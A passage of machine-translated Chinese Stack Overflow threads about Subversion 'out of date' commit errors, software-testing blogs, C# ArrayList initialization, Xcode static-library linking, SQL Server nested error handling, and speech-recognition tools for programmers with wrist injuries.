我只是在几个文件夹中遇到了同样的问题，这就是我要提交的：

1）在“团队同步”透视图中，右键单击文件夹>覆盖和更新
2）再次删除文件夹
3）提交并开心

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2011-06-06T11:01:16.400

谢谢你。这只是为我解决了它。svn update --force /文件名路径/

如果你最近在本地目录中的文件相同，则没有提示。如果文件不同，它会提示输入 tf、mf 等... 选择 mf（我的已满）确保不会覆盖任何内容，完成后我可以提交。

Jay CompuMatter

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2012-09-03T15:04:43.647

我设法通过点击更新按钮来解决它

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-09-18T02:31:40.653

就像@Alexander-Klyubin 建议的那样，在存储库中进行移动。它也会更快，特别是如果您有大量数据要移动，因为您不必再​​次通过网络传输所有数据。

```
svn mv https://username@server/svn/old/ https://username@server/svn/new/ 
```

应该可以正常工作

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2012-09-10T14:28:01.380

在执行命令之前删除您的文件或路径

```
sudo rm -r /path/to/dir/ 
```

后 ：

```
svn up and commit or delete 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-09-17T21:47:14.567

您确定您检查的是头部而不是较低的版本吗？另外，您是否进行了更新以确保您拥有最新版本？

上有一个关于这个的讨论[http://svn.haxx.se/users/archive-2007-01/0170.shtml](http://svn.haxx.se/users/archive-2007-01/0170.shtml)。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2008-09-17T21:48:56.327

直接在存储库中执行移动。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2013-02-21T17:26:13.043

消息“过时”错误至少还有一个其他原因。就我而言，问题是 .svn/dir-props 是通过运行“svn propset svn:ignore -F .gitignore”创建的。首次。删除 .svn/dir-props 似乎是个坏主意，可能会导致其他错误，因此最好使用“svn propdel”来清理错误的“svn propset”。

```
# Normal state, works fine.
> svn commit -m"bump"  
Sending        eac_cpf.xsl
Transmitting file data .
Committed revision 509.

# Set a property, but forget to commit.
> svn propset svn:ignore -F .gitignore .
property 'svn:ignore' set on '.'

# Edit a file. Should have committed before the edit.
> svn commit -m"bump"                   
Sending        .
svn: Commit failed (details follow):
svn: File or directory '.' is out of date; try updating
svn: resource out of date; try updating

# Delete the property.
> svn propdel svn:ignore .              
property 'svn:ignore' deleted from '.'.

# Now the commit works fine.
> svn commit -m"bump"     
Sending        eac_cpf.xsl
Transmitting file data .
Committed revision 510. 
```

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2015-09-06T07:56:51.203

如果您使用的是 github svn 桥，很可能是因为 github 方面发生了一些变化。解决方案很简单，你只需要运行`svn switch`，让它正确地找到自己，然后更新，一切都会工作。只需从结帐的根目录运行以下命令

```
svn info | grep Relative 
svn switch path_from_previous_command
svn update 
```

或者

```
svn switch `svn info | grep Relative | sed 's_.*: __'`
svn update 
```

这个解决方案的基础来自[Lee Preimesberger 的博客](http://preimesberger.blogspot.com/2015/05/svn-insisting-everything-out-of-date.html)

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2017-12-01T13:10:19.630

“清理”它会让你走上正轨。

右键单击 svn 文件夹，然后单击“清理”，如果出现该错误，请执行此操作。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-09-18T12:48:52.170

你是用它移动它`svn mv`，还是仅仅移动它`mv`？我认为使用 just`mv`可能会导致此问题。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2010-11-01T19:56:55.183

为了安全起见，我将目录移动到本地计算机，然后 svn 删除了愚蠢的目录，然后提交。当我尝试从本地计算机添加文件夹时，它仍然抛出错误（当我尝试重命名文件夹时，SVN move 做了同样的事情）。所以我恢复了，然后我做了一个 mkdir DIRNAME，添加并提交。然后我添加了内容并提交，它起作用了。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2012-06-06T06:39:45.173

在删除了几个目录后，我随机收到了这个错误，每个目录都包含一些文件。我通过 Netbeans 删除了目录，并意识到它实际上并没有删除它们。它似乎只是删除了目录中的所有内容并删除了对 Netbeans 中目录的引用。不过，它们确实仍然存在于文件系统中。确保它们已从文件系统中删除并再次尝试提交。

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2012-10-11T08:07:30.523

如果曾经通过简单地签出一个新的工作副本并用这个新签出的文件替换引发提交错误的 .svn 目录来解决类似的问题。在我的情况下，原因是在存储库损坏并从备份恢复之后，工作副本指向的修订版在恢复的存储库中不存在。还出现“项目过期”错误。在提交之前更新工作副本并没有解决这个问题，但是如上所述替换 .svn 可以。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2015-08-27T06:19:03.820

我这样做了，它对我有用：
1\. 备份您的文件。您可以简单地将代码复制到文本文件中。
2\. 右键单击​​您要提交的文件>>团队>>显示历史。3\. 在“显示历史”面板中，您将看到该文件的所有修订。右键单击文件的最新版本>>获取版本：它将覆盖您的本地更改。
4\. 现在，将您的代码与带有备份文件的最新文件合并（步骤#1）。
5\. 同步并提交新合并的文件。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2016-01-18T16:54:01.983

**将您的服务器和客户端升级到 Subversion 1.9。**

如果`out of date`错误在通常不应该发生的情况下随机发生，当您运行 commit 时，它可能表明您使用的是过时且不受支持的 Subversion 1.7 或更旧的客户端或服务器。

您应该升级服务器和客户端以解决问题。请参阅相关的 Subversion 1.9 发行说明条目：*[通过 HTTPv1 提交时出现“过期”错误](http://subversion.apache.org/docs/release-notes/1.9.html#httpv1-commit-race)*。

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2016-05-13T12:30:17.913

错误是因为您没有更新该特定文件，首先更新然后只有您可以提交该文件。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2016-12-14T16:43:33.390

尝试了所有，但直接在 .svn 中进行更改。没有任何帮助，所以这是我的解决方案。

在 Eclipse > Window > Show View > **History**我看到该文件不是最新版本，尽管我做了多个 svn "Override & Update" / "Revert" / delete file and checkout。

所以我去了 Package Explorer > Right click on file > **Replace with > Latest from Repository**。

历史视图中的另一个外观显示该文件现在处于最新版本。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2009-06-18T04:28:45.013

当我使用主干中的文件更新早期版本的分支时，就会发生这种情况。我使用 Windows 资源管理器从我的主干结帐文件夹中复制*文件*夹，并将它们粘贴到我的发布分支结帐文件夹的 Eclipse 视图中。现在 Windows 资源管理器被配置为不显示以“.”开头的“隐藏”文件，所以我没有注意到所有不正确的 .svn 文件都被粘贴到我的发布分支结帐文件夹中。嗬！

我的解决方案是清除损坏的 Eclipse 项目，再次检查，然后更仔细地复制新文件。我还更改了 Windows 以显示“隐藏”文件。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2011-12-20T02:42:28.083

尝试提交某些文件时出现此错误，只是它是我的工作副本中不存在的文件/文件夹。我真的不想经历移动文件和重新签出的麻烦，最后，我最终编辑了 .svn/entries 文件并删除了有问题的目录引用。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2013-11-18T10:58:55.690

就我而言，仅删除本地版本并重新签出新副本是一种解决方案。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2013-11-26T20:26:40.617

我刚收到这个错误。我建议您首先检查您的服务器是否存在原始文件。有时不会在您的本地文件夹中进行更改。如果这是您的情况，只需删除您的文件夹并再次结帐。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2015-02-06T08:35:59.057

为了解决，我需要恢复有问题的文件，并更新我的工作副本，后来我再次修改了文件，在这些步骤之后，错误不再发生。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2015-07-15T10:07:51.497

**只需在命令行中执行 svn up，或者如果您在 Windows 中，请选择 svn update 选项。**

*   完成此操作后，您就可以进行进一步的操作，例如提交和其他操作。

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2015-12-09T16:43:04.423

当我试图`commit`从一个`trunk`目录中时，我得到了这个。`svn update`从目录做`trunk`没有解决错误；但是，`svn update`从父目录（`.svn`目录所属的位置）执行确实解决了错误。

我对发生的事情的猜测（其中一个用例，这个“svn：E160024：资源已过期；尝试更新”可能有多种原因）：除此之外`trunk`，还有一个`branches`目录。我从 GitHub 中提取`branches/branch-1`了一个。`master`从父`svn update`目录（即我的工作副本的根目录）而不是`trunk`似乎`branches`除了`trunk`. 当我再次尝试`commit`时，没有错误。

然而，正如我上面所说，这可能是许多其他案例中的一个。

旁注：与有人建议的不同，我认为在`.svn`目录中手动播放不是一个好主意。

* * *

## 回答 #31

> 赞同：-1
> 
> 时间：2015-04-24T15:33:49.523

更容易做到这一点：

1）我在记事本中复制我的修改代码。2）接下来，更新文件。3）将记事本的代码复制到更新的文件中。4）在svn中提交。

# testing - 如果你只能推荐一篇关于软件测试的博客，你会推荐哪一篇？

> ID：87957
> 
> 赞同：10
> 
> 时间：2008-09-17T21:39:31.217
> 
> 标签：testing, blogs

我在这里发现了一个关于软件开发博客的问题，但我想知道这个社区阅读了哪些关于软件测试的博客。

如果您只需要推荐多个博客，请将每个博客发布在单独的答案中，以便其他人可以对特定博客进行投票。:)

谢谢！

**编辑：**我对聚合其他博客的网站不感兴趣，因为正如@Alan 所说（在他的回答中），那里既有好的博客也有不好的博客。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T22:29:32.047

当然，我的[博客](http://blogs.msdn.com/alanpa)很有趣——但不是每个人都喜欢。TestingReflections 很好，因为它聚合了一堆随机测试博客，但问题是它聚合了好与坏。许多进入该网站的帖子没有太多用处。

它还取决于您在寻找什么——您是在寻找关于测试哲学的博客、关于功能测试技术的博客、关于编写自动化测试的博客、包罗万象的博客，还是不同的博客？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-18T02:15:51.520

[阿巴卡斯](http://blog.abakas.com)。它是我的老板写的，但即使不是这样，我也会推荐它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-18T14:44:17.790

[谷歌测试博客](http://googletesting.blogspot.com/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-11-13T19:53:37.137

詹姆斯巴赫在[http://www.satisfice.com/blog/](http://www.satisfice.com/blog/)。很好。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-09-18T09:09:34.893

对于俄语社区来说绝对是：

[http://it4business.ru/forum/index.php?showforum=192](http://it4business.ru/forum/index.php?showforum=192)

但我想每个人都知道:)

# c# - C#：隐式 Arraylist 分配可能吗？

> ID：87970
> 
> 赞同：3
> 
> 时间：2008-09-17T21:41:28.853
> 
> 标签：c#, arraylist

我想通过指定一个值列表来填充一个数组列表，就像我将一个整数数组一样，但我不确定如何在不重复调用“add”方法的情况下这样做。

例如，我想将 { 1, 2, 3, "string1", "string2" } 分配给 arraylist。我知道对于其他数组，您可以进行如下分配：

```
int[] IntArray = {1,2,3}; 
```

是否有类似的方法可以为数组列表执行此操作？我尝试了 addrange 方法，但花括号方法没有实现 ICollection 接口。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-09-17T21:47:02.367

根据您使用的 C# 版本，您有不同的选择。

C# 3.0 有集合初始化器，详情见[Scott Gu 的博客](http://weblogs.asp.net/scottgu/archive/2007/03/08/new-c-orcas-language-features-automatic-properties-object-initializers-and-collection-initializers.aspx)

这是您的问题的一个示例。

```
ArrayList list = new ArrayList {1,2,3}; 
```

如果您正在初始化一个集合对象，大多数构造函数都采用与 AddRange 类似的组件，尽管正如您再次提到的，这可能不是一个选项。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-09-17T21:47:00.840

数组列表有接受ICollection的ctor，它是由Array类实现的。

```
object[] myArray = new object[] {1,2,3,"string1","string2"};
ArrayList myArrayList = new ArrayList(myArray); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T22:13:56.220

（有点回答我自己的问题但是......）

我发现最接近我想要的是使用 ArrayList.Adapter 方法：

```
object[] values = { 1, 2, 3, "string1", "string2" };
ArrayList AL = new ArrayList();
AL = ArrayList.Adapter(values);

//or during intialization
ArrayList AL2 = ArrayList.Adapter(values); 
```

这足以满足我的需要，但我希望它可以在一行中完成，而无需像其他人建议的那样创建临时数组。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T22:20:04.050

您的评论暗示您选择 ArrayList 是因为它是您找到的第一个组件。

假设您只是在寻找整数列表，这可能是最好的方法。

```
List<int> list = new List<int>{1,2,3}; 
```

如果您使用的是 C# 2.0（有泛型，但没有集合初始化器）。

```
List<int> list = new List<int>(new int[] {1, 2, 3}); 
```

尽管 int[] 格式在旧版本中可能不正确，但您可能必须指定数组中的项目数。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:53:21.290

我假设您没有使用具有集合初始值设定项的 C# 3.0。如果您不担心创建临时数组的开销，您可以在 1.1/2.0 中这样做：

```
ArrayList list = new ArrayList(new object[] { 1, 2, 3, "string1", "string2"}); 
```

# xcode - Xcode 3.1.1 和静态库

> ID：87979
> 
> 赞同：4
> 
> 时间：2008-09-17T21:42:38.430
> 
> 标签：xcode, macos

我是一位经验丰富的 VS.NET 用户，正在尝试在 Xcode 3.1.1 上启动和运行。
这是我要完成的工作：

我想要一个静态库（“Lib”）拥有自己的 xcodeproj 文件。我有一个可执行应用程序（“App”），它使用 Lib 来引用 Lib 的 xcodeproj 文件，以便对 Lib 的更改导致 App 重新链接。理想情况下，我希望能够在 App 的 Xcode 工作区中编辑 Lib 的源文件，这样我就不必一直忙于进行更改。

我从在线帮助中发现，我可以简单地将静态库 xcodeproj 拖到我的应用程序项目中，它会获得参考。我看到一旦我的静态库 xcodeproj 在我的应用程序的项目中，我可以简单地将它拖到应用程序的目标上，它就知道应用程序依赖于 Lib。这似乎是正确的道路，但事情还没有按照我想要的方式进行。

以下是我的问题：

1.  似乎仅仅让 App 依赖于 Lib 并不会导致 App 与 Lib 链接。看来我必须将 libLib.a 从 Lib 文件夹显式拖到 App 的“Link Binary With Libraries”构建阶段。在 VS.NET 中，只需将项目指定为解决方案依赖项即可将其添加到链接行。我只是想确保我没有遗漏任何东西。

2.  当我在 Xcode 中打开 App 并将 Lib.xcodeproj 拖入其中时，那里没有任何 Lib 的源文件。我只在“Lib.xcodeproj”文件夹下获得 libLib.a。在 VS.NET 中，我可以在此处编辑 Lib 的源文件并重新构建它，等等......但是在 Xcode 中使用这种方法，当我重新构建 App 时，对 Lib.cpp 的更改不会导致 Lib 重新构建。理想情况下，当我将 Lib.xcodeproj 拖到 App 中时，我会显示所有 Lib 的源文件和目标。有没有办法做到这一点？

提前感谢您的任何回复！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-09-18T01:33:52.557

您是正确的，使目标 A 依赖于目标 B（无论是在同一项目内还是跨项目）不会**导致**目标 A 链接到目标 B。您需要明确指定它们；这是因为它们是独立的概念，并且您可能在*不*希望彼此链接的目标之间存在依赖关系 - 例如，由目标 C 构建并用作构建的一部分的命令行工具目标 A 的过程。

此外，您是正确的，从项目 A 中引用项目 B 不会让您在项目 A 的窗口中看到项目 B 的源代码。那是因为 Xcode 没有与 Visual Studio 和 Eclipse 相同的“工作区”模型。您在上面提到了“包含项目 A 的工作区”的存在，但 Xcode 并没有任何这样的东西，只是一个*代表*项目 A的窗口。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-09-17T23:11:40.540

打开应用程序项目。右键单击应用程序目标并选择“获取信息”。然后转到“常规选项卡”并找到“直接依赖项”。单击 (+)（加号）按钮添加直接依赖项。Lib.xcodeproj 应该出现在您的可能性列表中。从该列表中选择 Lib 目标。

这应该实现在构建 App 目标时必须构建（或重新构建）Lib 项目。

（现在编辑我自己的帖子。我意识到我对问题中的第 2 点只字未提。我实际上仍在考虑第 2 点。我不确定这是否可能。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T23:20:30.037

我也是一个相当新的 Xcode 用户。我所知道的大部分内容都是从 James Bucanek 的 Xcode 书中学到的（ISBN 047175479x）。这是一本为/使用 Xcode 2.2 编写的旧书，但我发现其中几乎所有内容今天仍然适用于我，我目前使用 Xcode 3.1

如果您有兴趣，您可能会找到便宜的二手副本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-13T14:35:28.037

我也是Xcode 3.1的新手，刚刚玩过你提到的问题，发现你的第二个问题没有问题。无论您使用什么应用程序来编辑依赖库源代码，您的主项目都将重建依赖目标。我通过以下方式检查了它：

1.  通过记事本应用程序编辑了您的应用程序所依赖的库的源文件。
2.  选中依赖库项目引用，鼠标右键，选择'Open With Finder'，然后选中想要的源文件并进行编辑。

一切运作良好。

# sql - Sql Server 2005 错误处理 - 内部异常

> ID：87986
> 
> 赞同：4
> 
> 时间：2008-09-17T21:43:30.160
> 
> 标签：sql, sql-server, sql-server-2005, error-handling

在 C# 中，您可以获得原始错误并使用向上传递的内部异常跟踪执行路径（堆栈跟踪）。我想知道当嵌套 2 或 3 层深的存储过程中发生错误时，如何使用 sql server 2005 中的错误处理 try/catch 来实现这一点。

我希望像 ERROR_MESSAGE()、ERROR_LINE()、ERROR_PROCEDURE()、ERROR_SEVERITY() 这样的函数可以轻松地向上传递，以便顶级存储过程可以访问它们。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-03T11:13:19.897

处理此问题的最佳方法是使用 OUTPUT 参数和 XML。下面的示例代码将演示如何以及您可以修改您在 TopProcedure 中对 XML 执行的操作，以更好地处理您对错误的响应。

```
USE tempdb
go
CREATE PROCEDURE SubProcedure @RandomNumber int, @XMLErrors XML OUTPUT
AS
BEGIN
BEGIN TRY
    IF @RandomNumber > 50
        RaisError('Bad number set!',16,1)
    else
        select @RandomNumber
END TRY
BEGIN CATCH
    SET @XMLErrors = (SELECT * FROM (SELECT ERROR_MESSAGE() ErrorMessage, 
        ERROR_LINE() ErrorLine, ERROR_PROCEDURE() ErrorProcedure, 
        ERROR_SEVERITY() ErrorSeverity) a FOR XML AUTO, ELEMENTS, ROOT('root'))
END CATCH
END
go

CREATE PROCEDURE TopProcedure @RandomNumber int
AS
BEGIN
    declare @XMLErrors XML
    exec SubProcedure @RandomNumber, @XMLErrors OUTPUT
    IF @XMLErrors IS NOT NULL
        select @XMLErrors
END

go
exec TopProcedure 25
go
exec TopProcedure 55
go
DROP PROCEDURE TopProcedure
GO
DROP PROCEDURE SubProcedure
GO 
```

对 TopProcedure 的初始调用将返回 25。第二个将返回如下所示的 XML 块：

```
<root>
  <a>
    <ErrorMessage>Bad number set!</ErrorMessage>
    <ErrorLine>6</ErrorLine>
    <ErrorProcedure>SubProcedure</ErrorProcedure>
    <ErrorSeverity>16</ErrorSeverity>
  </a>
</root> 
```

享受

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-18T00:36:11.523

您可以执行此操作的一种方法是创建一个内存表并在捕获异常时将行插入其中。然后，您将重新引发异常，链上的下一个函数将有机会处理异常或将异常记录到内存表中。这很讨厌，但不幸的是似乎没有办法获得 T-SQL 调用堆栈:(

# speech-recognition - 面向开发人员的语音识别软件

> ID：87999
> 
> 赞同：47
> 
> 时间：2008-09-17T21:45:09.330
> 
> 标签：speech-recognition, voice, ergonomics, speech, code-by-voice

好吧，医生终于说出来了，我需要在手腕上放松几个月。由于我是一名 .NET 开发人员，这可能会暂时结束我的生计，我并不急于这样做。也就是说，开发人员有什么好的免提选项吗？有人成功使用了任何语音识别软件吗？

后记：我的手臂再次恢复到双手编程不成问题的程度。Dragon 自然地运行良好，但速度较慢，不像键盘那样我编程的速度比我想象的要快。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2008-12-08T19:15:28.903

### 它就在那里，并且有效...

那里有很多语音识别程序，我认为[Dragon NaturallySpeaking](http://www.nuance.com/naturallyspeaking/)是使用最广泛的程序之一。我自己用过它，它的质量给我留下了深刻的印象。那是几年前的事，我想现在情况已经进一步改善了。

### ……但这并不容易……

尽管它工作得非常好，但我不会说这是一个简单的解决方案。训练程序需要时间，即便如此，它也会出错。与打字相比，它非常慢，所以我不得不一直对自己说“不要抓住键盘，不要抓住键盘，......”（之后我无论如何都会抓住键盘）。我自己倾向于咕哝一点，这也没有让事情变得更好；-)。尤其是最初的几周可能会令人沮丧。如果您[的声音过于紧张](http://archives.cnn.com/2000/TECH/computing/05/23/voice.saving.tips.idg/)，您甚至会遇到[与声音相关的问题](http://www.ataword.com/voice.html)。

### ...尤其是对于程序员！

总而言之，**对于编写普通文本/散文的人来说**，这无疑是一个可行的解决方案。作为一名程序员，你处于一个完全不同的领域，没有真正的解决方案。事情现在可能已经改变了，但如果他们改变了，我会感到惊讶。

有什么问题？大多数 SR 软件都是为识别普通语言而构建的。程序员编写非常神秘的东西，如果不是不可能的话，很难找到能够在普通语言和代码之间进行转换的软件。例如，您将如何指示：

```
if (somevar == 'a')
{
   print('You pressed a!');
} 
```

使用普通 SR 程序中的命令，这是一个巨大的痛苦：“如果空格左括号等号等号撇号拼写撇号......”。而且我什至不是在谈论*导航*您的代码。有没有注意到您在编程时使用了多少键盘，以及这种用法与“普通”用户使用键盘的方式有何不同？

### 如何充分利用它

到目前为止，我只使用过 Dragon NaturallySpeaking (DNS)，所以我只能代表那个产品。有一些针对像程序员这样的人的有趣的附加组件和网站：

*   [Vocola](http://www.vocola.net)是一个非官方的插件，可让您轻松地将自己的命令添加到 DNS。我发现它基本上是必不可少的。您还可以找到其他程序员编写的命令集，例如导航代码。它基于一个用 Python 编写的软件包，因此周围也有一些更高级和花哨的软件包。另请查看 Vocola 的[资源页面](http://vocola.net/VoiceResources.html)。（警告：当我使用它时，安装 Vocola 时出现了一些问题；请查看下面的新闻组以获取信息！）
*   [SpeechComputing.com](http://speechcomputing.com/)是一个论坛/新闻组，有很多有趣的讨论。一个很好的起点。

### 结束语

似乎这个问题的最佳解决方案实际上是：

*   寻找绕过实际编码的方法。
*   尝试恢复。我有点不愿意推荐这本书，但它似乎对患有 RSI/腕管和其他慢性疼痛问题的人非常有效：[JE Sarno，Mindbody 处方](https://rads.stackoverflow.com/amzn/click/com/0446675156)。我现在正在使用它，我认为它绝对值得一读。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-12-02T16:24:31.360

我使用 Dragon NaturallySpeaking 10 Professional 指定 VB.net 和 TSQL。VB.net 本质上更接近于“口语”语言，但我看不出它为什么不能用于 C# 或其他语言。我从一个完全空的词汇表开始，然后从头开始构建它以满足我的需求（这就是我使用专业版的原因）。

以下是基本步骤（假设您已经创建并培训了一个用户）：

1.  基于“Base General - Empty Dictation”创建一个新词汇表。
2.  不要让它扫描您的文档或电子邮件。
3.  添加具有特定于您的编程语言发音的关键字列表（Dim、ByVal\by-val 等）。
4.  创建一个包含所有代码减去注释的 .txt 文档。
5.  从本文档中收集单词并添加它们的发音。
6.  使用文档来训练词汇的语言模型。

如果有人感兴趣，我会在有机会时写一些更详细的东西。

编辑：

以下是如何[指示 SQL 代码](https://stackoverflow.com/questions/350348/can-i-write-sql-using-speech-recognition)。如果您是数据库开发人员，则此处创建的单词列表可以包含在其他词汇表中。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2014-03-04T21:40:49.173

查看[使用 Python 通过语音进行编码](http://www.youtube.com/watch?v=8SkdfdXWYaI)。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-09-17T23:06:48.820

另一个想法是找到另一个优秀的开发人员来配对程序。它对我来说非常有效。我可以在不必放慢速度的情况下放松双手，最终生成质量更好的代码——或者至少不必进行太多的审查。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2011-08-26T22:27:00.273

对于所有 Linux 人员，我想分享一些链接。

让我们从[Simon](http://simon-listens.org) - 开源语音识别软件开始：

*   [西蒙倾听 - 研究和学徒的非营利组织](http://simon-listens.org)
*   [simon：开源语音识别](http://simon-listens.blogspot.com/)- 相关博客
*   [HTK 语音识别工具包](http://htk.eng.cam.ac.uk/)- 内部使用的引擎
*   [开源大词汇量 CSR 引擎 Julius](http://julius.sourceforge.jp/en_index.php)
*   [不在关于 Simon fetures 的 shlashdot 上](http://slashdot.org/story/08/01/19/1446213/Open-Source-Speech-Recognition)

和其他一些：

*   [侏儒语音控制](http://live.gnome.org/GnomeVoiceControl)
*   [https://wiki.ubuntu.com/SpeechRecognition](https://wiki.ubuntu.com/SpeechRecognition)
*   [http://en.wikipedia.org/wiki/Speech_recognition_in_Linux](http://en.wikipedia.org/wiki/Speech_recognition_in_Linux)
*   [语音代码](http://sourceforge.net/projects/voicecode/)

和

*   [关于 Linux 的文本到语音识别工具的相关 stackoverflow 问题。](https://stackoverflow.com/questions/877508/need-text-to-speech-and-speech-recognition-tools-for-linux)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-09-17T23:07:44.577

我知道我在这里有点跑题，对语音识别软件一无所知；但是，您可能会发现将键盘更改为 Dvorak 布局很有用，我听说这种布局对手腕更友好。

[http://en.wikipedia.org/wiki/Dvorak_Simplified_Keyboard](http://en.wikipedia.org/wiki/Dvorak_Simplified_Keyboard)

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-09-17T21:53:01.167

几年前我尝试过 Dragon，这是一场混杂单词和短语的噩梦 - 不推荐。我知道这是当时最好的事情，所以我并不乐观。

作为一个受难者，建议是：

1.  找一份要求尽可能少的 OT 的工作
2.  尝试各种键盘。根据我的经验，全职使用笔记本电脑效果最好。
3.  开始一个中低压力的举重计划。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-17T22:19:38.920

至于手腕问题，我大约在 10 年前就学会了用双手使用鼠标。

这出乎意料地简单，并大大缓解了紧张情绪。目前，我正在使用笔记本电脑，按下触摸板按钮会使我的拇指紧张。

当心。这些问题的持续时间可能比人们想象的要长。

* * *

ps你可能会添加一个标签'人体工程学'或其他东西 - 可以看出标题是关于*开发*语音识别的。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-12-30T17:10:21.247

如上所述，Dragon Naturally speak 是目前最好的语音识别软件，但 Microsoft Speech Recognition 紧随其后，并与 Vista 捆绑在一起。

Vocola 最近已移植到 MSR，并具有 .Net 集成功能。

一些提示

1.  学习口授需要一些时间。你会说话并不意味着你知道如何使用语音识别软件
2.  熟练使用 SR 和键盘/鼠标的组合比完全免提操作要容易得多。
3.  使用 CodeRush 或等价物来减少输入。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-01-19T18:58:07.340

语音编程的黄金标准是[VoiceCode](http://sourceforge.net/projects/voicecode/)。如果我没记错的话，它们支持 C++ 和 Python。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2008-12-02T16:57:37.517

我开始用左手做鼠标，这不仅对我有一点帮助，而且让我可以更自由地使用我的右手，如果你在编码时写了很多东西，这对你很有帮助..你可以滚动同时写下...

当我的问题开始出现时，我在手腕下放了一个水袋，我喜欢它！我的包很完美，它很长，我把它放在键盘前，这样我的手腕就可以放在那里……直到有一天我踩到它……

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2009-05-12T10:53:09.747

龙自然说话首选和 Vocola。Autohotkey 尽可能地自动化。虽然不容易编程。我试过; 几乎不可能。查看约翰·萨诺 (John Sarno) 的《治愈背痛》。它让我变得更好。我整天都在编程！

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2011-01-04T13:23:23.677

这里还有一点离题，我发现将 keboard 分成两部分和其他特殊键盘有帮助，只需检查 kinesis。我在 diigo 收集了有关此类硬件的信息：

*   [http://www.diigo.com/user/wierzowiecki/keyboard%20ergonomics](http://www.diigo.com/user/wierzowiecki/keyboard%20ergonomics)
*   [http://www.diigo.com/user/wierzowiecki/keyboard%20rsi](http://www.diigo.com/user/wierzowiecki/keyboard%20rsi)。

直接链接呢：

*   [http://www.fentek-ind.com/ergo.htm](http://www.fentek-ind.com/ergo.htm) - 不同的东西
*   [http://www.kinesis-ergo.com/contoured.htm](http://www.kinesis-ergo.com/contoured.htm) - Kinesis Advantage 轮廓键盘（可编程！）
*   [http://www.kinesis-ergo.com/foot.htm](http://www.kinesis-ergo.com/foot.htm)一些脚踏开关可以连接到键盘（例如用于窗口切换）
*   [http://www.kinesis-ergo.com/freestyle.htm](http://www.kinesis-ergo.com/freestyle.htm) - 到目前为止，我发现即使使用两个普通键盘也比一个好，所以我认为分离式自由泳也可以
*   [http://www.typematrix.com/](http://www.typematrix.com/) - 另一种解决方案
*   [http://www.maltron.com/](http://www.maltron.com/) - 有时一只手比另一只手打字更痛苦
*   [http://www.keybowl.com/](http://www.keybowl.com/) - 这看起来也很有趣
*   我相信还有很多其他有趣的解决方案

还有一件事！记住锻炼的休息时间。定期练习（例如小练习——每半小时不同一次）让事情变得更好！

*   [http://www.workrave.org/](http://www.workrave.org/) - 这会提醒你休息；）

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-09-17T21:52:19.407

[Scott Hanselman 大量](http://www.hanselman.com/blog/SpeechRecognitionInWindowsVistaImListening.aspx)[使用](http://www.hanselman.com/blog/TypingTestTwiceOnceWithVoiceRecognition.aspx)语音识别。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-12-08T18:28:38.517

我在 1996 年使用 Dragon Dictate 的原因和你一样。进展缓慢，但总比不工作好。我发现用代码填充 4x8 白板然后让其他人输入代码更容易编写代码。然后我使用 DD 进行调试。

当您阅读时，您可能会查看[Deborah Quilter](http://www.rsihelp.com/)关于 RSI 的书籍。他们信息量很大。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2008-09-17T23:13:07.497

我找不到一个链接（我确实看过），但有些键盘只有 5 个键，可以让你用一只手打字，我假设你只有一个坏手腕。

如果我找到一个链接，我会尝试给你发消息。*****